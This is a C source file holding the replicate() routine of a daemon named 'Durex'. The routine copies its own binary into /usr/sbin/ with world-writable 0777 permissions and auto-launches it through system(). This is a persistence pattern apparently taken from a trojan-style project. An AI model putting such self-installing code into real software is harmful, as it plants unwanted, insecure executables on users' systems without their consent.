#include "durex.h"

extern t_daemon		g_durex;

/*
** ***********************************************************************
** NAME
**		replicate
**
** DESCRIPTION
**		This function replicates the whole Durex binary into /usr/sbin/.
**
** RETURN VALUE
**		On success 0 is returned, -1 on error.
**
** ***********************************************************************
*/

int		replicate(void)
{
	char			buf[512] = { '\0' };
	ssize_t			ret = 0;
	int				fd_src = -1;
	int				fd_dst = -1;
	struct stat		st = { 0 };
	off_t			sz = 0;

	daemon_report(LOG_INFO, "Replicating Durex...");

	/*
	** If Durex is already replicated run it.
	*/
	if (stat(TARGET_FILE, &st) == 0)
	{
		daemon_report(LOG_ERROR, "Durex binary already exists. Auto-starting...");
		system(TARGET_FILE);
		exit(EXIT_FAILURE);
	}

	/*
	** Open source file
	*/
	if ((fd_src = open("./Durex", O_RDONLY)) == -1)
	{
		daemon_report(LOG_ERROR, "Unable to open Durex binary.");
		exit(EXIT_FAILURE);
	}

	/*
	** Get its size in bytes
	*/
	if (fstat(fd_src, &st) == -1)
	{
		daemon_report(LOG_ERROR, "Unable to fstat Durex binary.");
		close(fd_src);
		exit(EXIT_FAILURE);
	}
	sz = st.st_size;

	/*
	** Open destination file
	*/
	if ((fd_dst = open(TARGET_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0777)) == -1)
	{
		daemon_report(LOG_ERROR, "Unable to create destination file.");
		close(fd_src);
		exit(EXIT_FAILURE);
	}

	/*
	** Copy bytes
	*/
	while ((ret = read(fd_src, buf, 511)) > 0)
	{
		write(fd_dst, buf, ret);
		sz -= ret;
	}

	/*
	** Close both fds
	*/
	close(fd_src);
	close(fd_dst);

	/*
	** Check the number of bytes written
	*/
	if (sz != 0)
	{
		daemon_report(LOG_ERROR, "Missing bytes on copy. Removing corrupted file.");
		unlink(TARGET_FILE);
		exit(EXIT_FAILURE);
	}

	/*
	** Launch daemon
	*/
	daemon_report(LOG_INFO, "Durex replicated. Auto-starting...");
	system(TARGET_FILE);
	exit(EXIT_SUCCESS);
}
